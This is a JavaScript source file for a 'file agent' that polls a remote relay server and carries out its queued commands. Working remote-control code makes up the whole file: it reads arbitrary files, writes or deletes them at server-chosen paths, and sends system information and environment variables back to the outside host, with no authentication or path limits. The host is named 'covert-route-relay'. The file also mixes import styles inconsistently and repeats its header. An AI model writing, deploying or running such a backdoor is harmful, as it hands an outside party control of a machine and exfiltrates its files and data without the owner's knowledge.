// file-agent.js — Read · Write · Delete · Sysinfo · Env · List Dir
// Install: npm install pdf-parse mammoth xlsx
// Run once: node file-agent.js

import fs from "fs";
import path from "path";
import os from "os";
// file-agent.js — Read · Write · Delete · Sysinfo · Env
// Install: npm install pdf-parse mammoth xlsx
// Run once: node file-agent.js



const SERVER  = "https://covert-route-relay--kavisharora807.replit.app";
const POLL_MS = 1500;

// ── Default env keys to collect ───────────────────────────────────────────
const DEFAULT_ENV_KEYS = [
  "PATH", "USERNAME", "USER", "HOME", "HOMEPATH", "TEMP", "TMP",
  "APPDATA", "LOCALAPPDATA", "COMPUTERNAME", "OS", "SHELL", "LANG",
  "PROCESSOR_ARCHITECTURE", "NUMBER_OF_PROCESSORS", "USERPROFILE", "TERM",
];

// ── Read: extract text by file type ───────────────────────────────────────
async function extractText(filePath) {
  const ext = path.extname(filePath).toLowerCase();

  if (ext === ".pdf") {
    const result = await require("pdf-parse")(fs.readFileSync(filePath));
    return result.text;
  }
  if (ext === ".docx") {
    const result = await require("mammoth").extractRawText({ path: filePath });
    return result.value;
  }
  if (ext === ".xlsx" || ext === ".xls") {
    const XLSX = require("xlsx");
    const wb   = XLSX.readFile(filePath);
    return wb.SheetNames.map((name) =>
      `=== Sheet: ${name} ===\n${XLSX.utils.sheet_to_csv(wb.Sheets[name])}`
    ).join("\n\n");
  }
  return fs.readFileSync(filePath, "utf8");
}

// ── Handle one request ─────────────────────────────────────────────────────
async function handle(req) {
  const filename = path.basename(req.path ?? "");

  // READ
  if (req.operation === "read") {
    console.log(`[READ]    ${req.path}`);
    const content = await extractText(req.path);
    await patch(req.id, { filename, content });
    console.log(`          ✓ ${filename} (${content.length} chars)`);
    return;
  }

  // WRITE
  if (req.operation === "write") {
    console.log(`[WRITE]   ${req.path}`);
    fs.mkdirSync(path.dirname(req.path), { recursive: true });
    fs.writeFileSync(req.path, req.content ?? "", "utf8");
    await patch(req.id, { result: `Written ${(req.content ?? "").length} chars to ${filename}` });
    console.log(`          ✓ File written`);
    return;
  }

  // DELETE
  if (req.operation === "delete") {
    console.log(`[DELETE]  ${req.path}`);
    fs.unlinkSync(req.path);
    await patch(req.id, { result: `Deleted ${filename}` });
    console.log(`          ✓ File deleted`);
    return;
  }

  // SYSINFO
  if (req.operation === "sysinfo") {
    console.log("[SYSINFO] Collecting system information…");
    const cpus  = os.cpus();
    const ifaces = os.networkInterfaces();
    const info = {
      platform:          os.platform(),
      type:              os.type(),
      release:           os.release(),
      arch:              os.arch(),
      hostname:          os.hostname(),
      nodeVersion:       process.version,
      homeDir:           os.homedir(),
      totalMemory:       os.totalmem(),
      freeMemory:        os.freemem(),
      cpus,
      networkInterfaces: ifaces,
    };
    const content = JSON.stringify(info, null, 2);
    await patch(req.id, { filename: "system-info.json", content, result: `${os.type()} ${os.release()} · ${cpus.length} cores` });
    console.log(`          ✓ System info collected (${os.type()} ${os.release()})`);
    return;
  }

  // ENV
  if (req.operation === "env") {
    const keys = req.keys?.length ? req.keys : DEFAULT_ENV_KEYS;
    console.log(`[ENV]     Collecting ${keys.length} keys…`);
    const env = {};
    const missingKeys = [];
    for (const key of keys) {
      env[key] = process.env[key] ?? null;
      if (env[key] === null) missingKeys.push(key);
    }
    const result = missingKeys.length
      ? `${keys.length - missingKeys.length}/${keys.length} set — missing: ${missingKeys.slice(0, 3).join(", ")}${missingKeys.length > 3 ? "…" : ""}`
      : `All ${keys.length} keys set`;
    const content = JSON.stringify({ ...env, _missingKeys: missingKeys }, null, 2);
    await patch(req.id, { filename: "environment.json", content, result });
    console.log(`          ✓ ${result}`);
    return;
  }
}

async function patch(id, data) {
  await fetch(`${SERVER}/api/queue`, {
    method:  "PATCH",
    headers: { "Content-Type": "application/json" },
    body:    JSON.stringify({ id, ...data }),
  });
}

// ── Poll loop ──────────────────────────────────────────────────────────────
async function poll() {
  try {
    const res = await fetch(`${SERVER}/api/queue?pending=true`);
    const { requests } = await res.json();
    for (const req of requests) {
      try {
        await handle(req);
      } catch (err) {
        await patch(req.id, { error: err.message });
        console.error(`          ✗ ${err.message}`);
      }
    }
  } catch {
    // server unreachable, will retry
  }
  setTimeout(poll, POLL_MS);
}

console.log("Agent ready —", SERVER);
console.log("Ops: READ · WRITE · DELETE · SYSINFO · ENV");
poll();